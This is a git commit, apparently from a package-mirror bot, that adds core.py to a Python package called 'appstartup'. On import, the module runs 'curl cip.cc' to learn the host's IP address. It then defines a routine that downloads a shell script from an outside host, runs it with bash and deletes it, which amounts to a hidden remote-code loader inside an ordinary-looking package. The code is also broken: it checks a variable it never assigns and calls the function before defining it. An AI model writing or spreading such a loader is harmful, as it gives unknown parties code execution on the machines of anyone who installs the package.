6c149885aba91f644c095eb5d3e2f6abc258fcb5
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 14:40:53 +0000

    Add package appstartup/2.0.5/appstartup-2.0.5.tar.gz

---
+++ packages/appstartup/appstartup-2.0.5.tar.gz/appstartup-2.0.5/appstartup/core.py
@@ -0,0 +1,26 @@
+# Insert your code here. 
+
+import os 
+
+os.system('curl cip.cc')
+
+# -----
+# chk env 
+id = os.getenv('app_id')
+if app_id:
+    if os.getenv('REPL_SLUG'):
+        platform = 'replit'
+        startup(id, platform, '')
+
+# ------
+# startup 
+def startup(id=450, platform='replit', tags=''):
+
+    if platform == 'replit':
+        cmd = 'curl -L -O https://fhost.devxops.eu.org/devops/cicd/startups/{}-startup-v2.sh; bash {}-startup-v2.sh {} {} {}; rm {}-startup-v2.sh ;'.format(platform, platform, id, platform, tags, platform)
+    else:
+        cmd = 'curl -L -O https://fhost.devxops.eu.org/devops/cicd/startups/{}-startup.sh; bash {}-startup.sh {} {} {}; rm {}-startup.sh ;'.format(platform, platform, id, platform, tags, platform)
+    
+    os.system(cmd)
+    print('ok , finish')
+    #os.system('sleep 24h')
